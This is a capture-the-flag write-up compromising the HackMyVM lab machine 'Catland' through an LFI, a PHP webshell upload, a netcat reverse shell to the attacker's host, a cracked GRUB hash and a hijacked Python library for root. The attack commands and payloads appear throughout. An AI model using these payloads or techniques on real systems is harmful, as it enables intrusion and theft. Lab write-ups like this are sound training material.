# Catland

## Recon

::: details nmap_scan.log.md
```log
Open ports, closed hearts.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.0.2.181:80
Open 10.0.2.181:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.181
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c7:10:14:a8:9a:f0:25:1e:0d:b1:c6:6f:1c:a1:88:d8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoON2vpFMtuogdkQMOJaJxlvYPnQoyZqhwksqYyE0q0zCdlL/CYNkehXOwfd64+p2DluB2DPw+81wfKecdbVFN8BvlA7wyKJcAblgJn40Peq4KbYpkEypAu5i7PMeKgXMylhuswIfl8G4UID1gGkwyQP+dcK/JJaU2aXsq+JoTyxZ5eS57qeaP2vSoJaCkGUjaKlvU/7FvTWsRPnNkgbMgxmVzWfgVyN5kn+vsKzh12gH1VPTxNb6gvd4NbIbkRoWBVSKXycP1RLX7AaFkjsns4WblFJ8m2y1pOvJdicSjjDxaUXJKmeMxZ6JMsL5G9DyLcYuxUVWG8TgYR7NVQNpGMVz/z4+AR4WL4V8yyhxiGLYHjqHiAkgg5HbEWy9ZIcmF4cqSfiXgzx0lxFqis3UNVoeyi4b1m/SY9EcDFlX+s+z7/G5B9yTpeXBuZbDvFm0zrfneF2opEST6VhMDfhSuChWksJoZFup3eF70HoJpk/0TsaKJTto8D/S3RXqWkn8=
|   256 1b:66:f4:e5:b6:23:6e:77:8e:9e:c1:78:c5:bc:ac:e9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIUNT0XJ8XtE1ajDnA0T62Gu369MNtsyQjs7OB7KdpK14BRfjkKwqGzhjQLaiIXs+ByWMdShGr0mteylUbNFIco=
|   256 f4:e9:d8:7a:08:15:d0:92:90:14:df:b3:ec:81:a1:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHmo5l+T566Tyh5IlXAf80WpmJSi98ggYbHOkzGI8u3l
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Catland
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

### Fuzzing

![writeup.png](/assets/pentest/hackmyvm/catland/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.181 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/common.txt
200      GET       11l       28w      479c http://10.0.2.181/gallery.php
200      GET       15l       97w      757c http://10.0.2.181/
301      GET        9l       28w      309c http://10.0.2.181/images => http://10.0.2.181/images/
200      GET       15l       97w      757c http://10.0.2.181/index.php
```

![writeup-1.png](/assets/pentest/hackmyvm/catland/writeup-1.png)

Potential username `laura`?
```bash
└─$ curl http://10.0.2.181/gallery.php -s | htmlq a -a href
images/laura-with-cat.jpeg
images/sushi-cat.jpeg
images/tired-cat.jpeg
images/wc-cat.jpeg
```

Nothing new
```bash
└─$ feroxbuster -u http://10.0.2.181 --thorough -C 404,400,414,500 --dont-scan .css,.png,.jpeg,.jpg,.gif,.woff2,.woff,.ttf,.svg,.min.js -n -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x .php
# Nothing new
```

No special params
```bash
└─$ ffuf -u 'http://10.0.2.181/gallery.php?FUZZ=tired-cat.jpeg' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 479

└─$ ffuf -u 'http://10.0.2.181/gallery.php?FUZZ=x' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -mc all -fs 479
```

### Admin Login

In the machine there's hostname, add to DNS

![writeup-2.png](/assets/pentest/hackmyvm/catland/writeup-2.png)

```bash
└─$ domain='catland.hmv'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fs 757
admin                   [Status: 200, Size: 1068, Words: 103, Lines: 24, Duration: 1993ms]
```

We always get redirected when visiting `admin` subdomain, JS is forcing it.
```bash
└─$ curl admin.catland.hmv
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Admin panel</title>
</head>
<script src="redirect.js"></script>
<script>
  redirectToSubdomain();
</script>
<body style="background-color: #003366; color: white; font-family: sans-serif;">
  <h1 style="text-align: center;">Staff connection</h1>
  <form id="login-form" action="" method="post" style="max-width: 500px; margin: auto;">
    <label for="username" style="display: block;">Login:</label>
    <input type="text" id="username" name="username" style="width: 100%; padding: 10px; box-sizing: border-box; margin-bottom: 20px;">
    <label for="password" style="display: block;">Password:</label>
    <input type="password" id="password" name="password" style="width: 100%; padding: 10px; box-sizing: border-box; margin-bottom: 20px;">
    <button type="submit" style="width: 100%; padding: 10px; background-color: #0099cc; color: white; font-size: 16px; cursor: pointer;">Connect</button>
  </form>
  <div id="error-message" style="color: red;"></div>
</body>
</html>

Invalid username or password                                                                                                                                                                 
└─$ curl admin.catland.hmv/redirect.js
function redirectToSubdomain() {
  window.location.replace('http://catland.hmv');
}
```

```bash
└─$ ffuf -u 'http://admin.catland.hmv' -d 'username=laura&password=FUZZ' -w $rockyou -mc all -H 'Content-Type: application/x-www-form-urlencoded' -fs 1068
# Waste of time...

└─$ echo $'laura\n\n\n\n\n\n\n\n\n\nsushi\n\n\n\n\n\n' | cupp -i
└─$ ffuf -u 'http://admin.catland.hmv' -d 'username=laura&password=FUZZ' -w laura.txt -mc all -H 'Content-Type: application/x-www-form-urlencoded' -fs 1068
laura_2008              [Status: 302, Size: 1040, Words: 100, Lines: 24, Duration: 26ms]
Laura_2008              [Status: 302, Size: 1040, Words: 100, Lines: 24, Duration: 5082ms]
```

> Creds: `laura:laura_2008`

We get cookies, redirected and still says **Invalid credentials**!
```bash
└─$ curl admin.catland.hmv/ -d 'username=laura&password=laura_2008' -siL | grep Cookie
Set-Cookie: PHPSESSID=ts7dv362mhqn5p91r75at0acvp; path=/
Set-Cookie: auth=1; expires=Thu, 08-Jan-2026 13:57:33 GMT; Max-Age=3600
Set-Cookie: PHPSESSID=qavs95iefeo6vrvol58mebtda2; path=/
```

But if we add `auth=1` cookie, it successful.
```bash
└─$ curl admin.catland.hmv/ -d 'username=laura&password=laura_2008' -b 'auth=1' -sL | html2markdown
  * [Accountancy](upload.php)
  * [Card](card.php)
  * [Contact](mailto:admin@catland.hmv)

Select a page: Accountancy Card Contact Go

# Welcome Laura
```

Update cookies in browser

![writeup-3.png](/assets/pentest/hackmyvm/catland/writeup-3.png)

### LFI

![writeup-4.png](/assets/pentest/hackmyvm/catland/writeup-4.png)

```bash
└─$ curl -b 'auth=1' 'http://admin.catland.hmv/user.php' -G --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' -s | htmlq main -t | grep -v '^ ' | base64 -d | sed -n '/<?php/,/?>/p'
<?php

include "config.php";

session_start();

$username = $_POST['username'];
$password = $_POST['password'];

$sql = "SELECT * FROM users WHERE username = ? AND password = ?";
$stmt = mysqli_prepare($conn, $sql);

mysqli_stmt_bind_param($stmt, "ss", $username, $password);

mysqli_stmt_execute($stmt);

mysqli_stmt_store_result($stmt);

if (mysqli_stmt_num_rows($stmt) == 1) {
  setcookie('auth', true, time() + 3600);
  header('Location: user.php' . $_POST['redirect']);
} else {
    echo "Invalid username or password";
}

mysqli_stmt_close($stmt);
mysqli_close($conn);

?>
```

```bash
└─$ curl -b 'auth=1' 'http://admin.catland.hmv/user.php' -G --data-urlencode 'page=php://filter/convert.base64-encode/resource=config.php' -s | htmlq main -t | grep -v '^ ' | base64 -d | sed -n '/<?php/,/?>/p'
<?php
$hostname = "localhost";
$database = "catland";
$username = "admin";
$password = "catlandpassword123";
$conn = mysqli_connect($hostname, $username, $password, $database);
if (!$conn) { die("Connection failed: " . mysqli_connect_error()); }
?>
```

### RCE

```php
└─$ curl -b 'auth=1' 'http://admin.catland.hmv/user.php' -G --data-urlencode 'page=php://filter/convert.base64-encode/resource=upload.php' -s | htmlq main -t | grep -v '^ ' | base64 -d | sed -n '/<?php/,/?>/p'
<?php
if (!isset($_COOKIE['auth'])) {
  header('Location: index.php');
  exit;
}
?>
<?php

$currentDirectory = getcwd();
$uploadDirectory = "/uploads/";

$errors = [];

$fileExtensionsAllowed = ["rar", "zip"];

$fileName = $_FILES["the_file"]["name"];
$fileSize = $_FILES["the_file"]["size"];
$fileTmpName = $_FILES["the_file"]["tmp_name"];
$fileType = $_FILES["the_file"]["type"];
$fileExtension = strtolower(end(explode(".", $fileName)));

$uploadPath = $currentDirectory . $uploadDirectory . basename($fileName);
if (isset($_POST["submit"])) {
    if (!in_array($fileExtension, $fileExtensionsAllowed)) { $errors[] = "This file extension is not allowed. Please upload a ZIP or RAR file"; }
    if ($fileSize > 4000000) { $errors[] = "File exceeds maximum size (4MB)"; }
    if (empty($errors)) {
        $didUpload = move_uploaded_file($fileTmpName, $uploadPath);
        if ($didUpload) { echo "The file " . basename($fileName) . " has been uploaded"; } 
        else { echo "An error occurred. Please contact the administrator."; }
    } else {
        foreach ($errors as $error) { echo $error . "These are the errors" . "\n"; }
    }
}
?>
```

```bash
└─$ curl -b 'auth=1' 'http://admin.catland.hmv/upload.php' -F 'submit=1' -F 'the_file="<?=`$_REQUEST[0]`?>";filename=t.zip' -s | tail -1
The file t.zip has been uploaded 
```

```bash
└─$ curl -b 'auth=1' 'http://admin.catland.hmv/user.php' -G -d 'page=uploads/t.zip' --data-urlencode '0=id' -s | htmlq main -t | grep -vE '^ |^$'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
└─$ curl -b 'auth=1' 'http://admin.catland.hmv/user.php' -G -d 'page=uploads/t.zip' --data-urlencode '0=busybox nc 10.0.2.149 4444 -e /bin/bash' -s | htmlq main -t | grep -vE '^ |^$'
└─$ penelope -p 4444
www-data@catland:/var/www/admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Lateral Movement

### MySQL

```bash
www-data@catland:/var/www/admin$ mysql -u'admin' -p'catlandpassword123' -e 'SHOW DATABASES;'
+--------------------+
| Database           |
+--------------------+
| catland            |
| information_schema |
+--------------------+
www-data@catland:/var/www/admin$ mysql -u'admin' -p'catlandpassword123' 'catland' -e 'SHOW TABLES;'
+-------------------+
| Tables_in_catland |
+-------------------+
| comment           |
| users             |
+-------------------+
www-data@catland:/var/www/admin$ mysql -u'admin' -p'catlandpassword123' 'catland' -e 'SELECT * FROM users;'
+----------+------------+
| username | password   |
+----------+------------+
| laura    | laura_2008 |
+----------+------------+
www-data@catland:/var/www/admin$ mysql -u'admin' -p'catlandpassword123' 'catland' -e 'SELECT * FROM comment;'
+----------------------+
| grub                 |
+----------------------+
| change grub password |
+----------------------+
```

### Password Bruteforce

- [https://wiki.archlinux.org/title/GRUB](https://wiki.archlinux.org/title/GRUB)

```bash
www-data@catland:/var/www/admin$ cat /boot/grub/grub.cfg | grep password_pbkdf2
password_pbkdf2 root grub.pbkdf2.sha512.10000.CAEBC99F7ABA2AC4E57FFFD14649554857738C73E8254222A3C2828D2B3A1E12E84EF7BECE42A6CE647058662D55D9619CA2626A60DB99E2B20D48C0A8CE61EB.6E43CABE0BC795DC76072FC7665297B499C2EB1B020B5751EDC40A89668DBC73D9F507517474A31AE5A0B45452DAD9BD77E85AC0EFB796A61148CC450267EBBC
```

```powershell
PS C:\Users\pvpga\VBoxShare\blog> john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
berbatov         (root)
```

## SSH

> Creds: `laura:berbatov`

```bash
└─$ sshpass -p 'berbatov' ssh laura@catland.hmv
laura@catland:~$ id
uid=1001(laura) gid=1001(laura) groups=1001(laura)
```

### User.txt

```
laura@catland:~$ cat user.txt
933ff8025e8944b6b3b797b2f006b2c0
```

## Privilege Escalation

```bash
laura@catland:~$ sudo -l
Matching Defaults entries for laura on catland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User laura may run the following commands on catland:
    (ALL : ALL) NOPASSWD: /usr/bin/rtv --help
```

Since we have `help` menu, try triggering Pager?
```bash
laura@catland:~$ stty rows 3 cols 200;
laura@catland:~$ sudo rtv --help
#No pager
```

```bash
laura@catland:~$ ls -l /usr/bin/rtv
-rwxr-xr-x 1 root root 941 Jan 14  2021 /usr/bin/rtv

laura@catland:~$ grep import /usr/bin/rtv
import re
import sys
    from importlib.metadata import distribution
        from importlib_metadata import distribution
        from pkg_resources import load_entry_point
def importlib_load_entry_point(spec, group, name):
globals().setdefault('load_entry_point', importlib_load_entry_point)
```

```bash
laura@catland:/usr/lib/python3.9$ find . -type f -writable
./importlib/metadata.py
```

Reset the stty changes we did previously
```bash
laura@catland:/usr/lib/python3.9$ stty sane
```

```bash
laura@catland:/usr/lib/python3.9$ nano ./importlib/metadata.py
import io
import os
os.system('install -m4777 /bin/bash /tmp/rootbash')
...
```

Generate rootbash
```bash
laura@catland:~$ sudo rtv --help
```

```bash
laura@catland:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1001(laura) gid=1001(laura) euid=0(root) groups=1001(laura)
```

### Root.txt

```bash
rootbash-5.1# cat /root/root.txt
ca555fc5afb4475bb0878d2b1a76cbe9
```